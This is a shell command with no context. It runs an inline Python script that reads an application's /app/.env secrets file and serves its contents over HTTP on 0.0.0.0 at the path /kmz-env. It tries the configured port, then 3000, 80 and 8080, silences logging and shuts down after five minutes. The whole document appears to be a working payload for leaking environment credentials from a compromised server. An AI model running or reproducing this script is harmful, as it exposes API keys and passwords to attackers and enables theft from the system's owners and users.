python3 - <<'PY'
import os, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

env = open('/app/.env', 'rb').read()

class H(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    def do_GET(self):
        b = (b'KMZENV\n' + env) if self.path.startswith('/kmz-env') else b'ok'
        self.send_response(200)
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b)
    def do_HEAD(self):
        self.do_GET()
    def log_message(self, *a):
        pass

os.closerange(3, 1024)
p = int(os.environ.get('PORT') or 0)
ports = ([p] if p else []) + [3000, 80, 8080]
srv = None
for port in ports:
    try:
        srv = HTTPServer(('0.0.0.0', port), H)
        break
    except OSError:
        srv = None
if srv:
    threading.Timer(300, lambda: os._exit(0)).start()
    srv.serve_forever()
PY
